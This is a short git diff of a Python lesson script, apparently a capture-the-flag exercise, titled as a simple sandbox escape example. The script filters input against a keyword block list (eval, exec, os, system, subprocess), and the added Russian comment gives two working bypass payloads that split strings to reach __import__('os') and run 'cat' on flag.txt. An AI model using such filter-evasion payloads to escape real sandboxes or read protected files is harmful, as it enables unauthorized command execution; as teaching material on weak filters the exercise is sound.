@@ -5,6 +5,9 @@ simple sandbox escape example.
 """
 
 
+import os
+
+
 def main():
     text = input('>>> ')
     for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess']:
@@ -34,3 +37,11 @@ if __name__ == '__main__':
             main()
         except Exception as e:
             print(f"Ой! что-то сломалось!\n{ERROR}{e}{ENDC}")
+
+"""
+Смотрим содержимое дириктории:
+print(__builtins__["__impor"+"t__"]("o"+"s").listdir("./Lesson10"))
+
+Печатаем содержимое файла flag.txt
+print(getattr(__builtins__["__impor"+"t__"]("o"+"s"), "sys"+"tem")("cat ./Lesson10/flag.txt"))
+"""
